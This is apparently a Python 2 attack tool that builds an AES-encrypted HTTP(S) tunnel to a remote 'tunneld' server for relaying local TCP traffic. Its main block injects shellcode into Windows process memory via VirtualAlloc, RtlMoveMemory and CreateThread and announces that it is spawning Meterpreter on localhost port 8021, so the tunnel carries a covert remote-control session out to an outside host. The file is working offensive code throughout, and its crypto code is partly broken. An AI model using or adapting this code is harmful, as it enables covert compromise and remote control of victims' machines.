#!/usr/bin/env python
import socket, time
import httplib, urllib
from uuid import uuid4
import threading
import thread
import sys
from Crypto.Cipher import AES
import base64 
import ssl
import multiprocessing
import ctypes
from config import user_config
from config import aes_share

#import test_shell

BUFFER = 1024 * 50


class Connection():
    
    def __init__(self, connection_id, remote_addr, proxy_addr,aes_secret):
        self.id = connection_id
        conn_dest = proxy_addr if proxy_addr else remote_addr
        print "Establishing connection with remote tunneld at %s:%s" % (conn_dest['host'], conn_dest['port'])
        self.http_conn = httplib.HTTPSConnection(conn_dest['host'], conn_dest['port'])
        self.remote_addr = remote_addr
        self.aes_secret = aes_secret

    def _url(self, url):
        return "http://{host}:{port}{url}".format(host=self.remote_addr['host'], port=self.remote_addr['port'], url=url)

    def create(self, target_addr):
        params = urllib.urlencode({"host": target_addr['host'], "port": target_addr['port']})
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

        self.http_conn.request("POST", self._url("/" + self.id), params, headers)

        response = self.http_conn.getresponse()
        response.read()
        if response.status == 200:
            print 'Successfully create connection'
            return True 
        else:
            print 'Fail to establish connection: status %s because %s' % (response.status, response.reason)
            return False 

    def send(self, data):
        BLOCK_SIZE = 32
        PADDING = '{'
        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING        
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
        data = EncodeAES(self.aes_secret, data)
        print "Test: " + data
        params = urllib.urlencode({"data": data})
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        try: 
            self.http_conn.request("PUT", self._url("/" + self.id), params, headers)
            response = self.http_conn.getresponse()
            response.read()
            print response.status 
        except (httplib.HTTPResponse, socket.error) as ex:
            print "Error Sending Data: %s" % ex

    def receive(self):
        PADDING = '{'
        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING        
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
        try: 
            self.http_conn.request("GET", "/" + self.id)
            response = self.http_conn.getresponse()
            data = response.read()
            if response.status == 200:
                return DecodeAES(self.aes_secret,data)
            else: 
                return None
        except (httplib.HTTPResponse, socket.error) as ex:
            print "Error Receiving Data: %s" % ex
            return None 

    def close(self):
        print "Close connection to target at remote tunnel"
        self.http_conn.request("DELETE", "/" + self.id)
        self.http_conn.getresponse()

class SendThread(threading.Thread):

    """
    Thread to send data to remote host
    """
    
    def __init__(self, client, connection,aes_secret):
        threading.Thread.__init__(self, name="Send-Thread")
        self.client = client
        self.socket = client.socket
        self.conn = connection
        self.aes_secret = aes_secret
        self._stop = threading.Event()

    def run(self):
        
        
        while not self.stopped():
            print "Getting data from client to send"
            try:
                data = self.socket.recv(BUFFER)
                if data == '': 
                    print "Client's socket connection broken"
                    # There should be a nicer way to stop receiver
                    self.client.receiver.stop()
                    self.client.receiver.join()
                    self.conn.close()
                    return

                print "Sending data ... %s " % data
                self.conn.send(data)
            except socket.timeout:
                print "time out"

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.isSet()

class ReceiveThread(threading.Thread):

    """
    Thread to receive data from remote host
    """

    def __init__(self, client, connection,aes_secret):
        threading.Thread.__init__(self, name="Receive-Thread")
        self.client = client
        self.socket = client.socket
        self.conn = connection
        self._stop = threading.Event()
        self.aes_secret = aes_secret

    def run(self):
        while not self.stopped():
            print "Retreiving data from remote tunneld"
            data = self.conn.receive()
            if data:
                sent = self.socket.sendall(data)
            else:
                print "No data received"
                # sleep for sometime before trying to get data again
                time.sleep(1)

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.isSet()

class ClientWorker(object):

    def __init__(self, socket, remote_addr, target_addr, proxy_addr,aes_secret):
        #threading.Thread.__init__(self)
        self.socket = socket
        self.remote_addr = remote_addr 
        self.target_addr = target_addr
        self.proxy_addr = proxy_addr
        self.aes_secret = aes_secret

    def start(self):
        #generate unique connection ID
        connection_id = str(uuid4())
        #main connection for create and close
        self.connection = Connection(connection_id, self.remote_addr, self.proxy_addr,self.aes_secret)

        if self.connection.create(self.target_addr):
            self.sender = SendThread(self, Connection(connection_id, self.remote_addr, self.proxy_addr,self.aes_secret),self.aes_secret
)
            self.receiver = ReceiveThread(self, Connection(connection_id, self.remote_addr, self.proxy_addr,self.aes_secret),self.aes_secret
)
            self.sender.start()
            self.receiver.start()

    def stop(self):
        #stop read and send threads
        self.sender.stop()
        self.receiver.stop()
        #send close signal to remote server
        self.connection.close()
        #wait for read and send threads to stop and close local socket
        self.sender.join()
        self.receiver.join()
        self.socket.close()




def start_tunnel(listen_port, remote_addr, target_addr, proxy_addr,aes_secret):
    """Start tunnel"""
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.settimeout(None)
    listen_sock.bind(('', int(listen_port)))
    listen_sock.listen(1)
    print "waiting for connection"
    workers = []
    try:
        while True:
            c_sock, addr = listen_sock.accept() 
            c_sock.settimeout(20)
            print "connected by ", addr
            worker = ClientWorker(c_sock, remote_addr, target_addr, proxy_addr,aes_secret)
            workers.append(worker)
            worker.start()
    except (KeyboardInterrupt, SystemExit):
        listen_sock.close()
        for w in workers:
            w.stop()
        for w in workers:
            w.join()
        sys.exit()



def inject(shellcode):
# special thanks to Debasish Mandal (http://www.debasish.in/2012_04_01_archive.html)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
    ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

if __name__ == "__main__":

#set aes secret
    cipher = AES.new(aes_share.secret)

#launch shellcode
#launch shellcode
    t = threading.Thread(target=inject, args=(user_config.shellcode,))
    t.start()     
    #p = multiprocessing.Process(target=inject, args=(user_config.shellcode,))
    print "[*] Spawning meterpreter on localhost on port: 8021"
    #jobs = []
    #jobs.append(p)
    #p.start()    

    start_tunnel(user_config.listen_port, user_config.remote_addr, user_config.target_addr, user_config.proxy_addr,cipher)




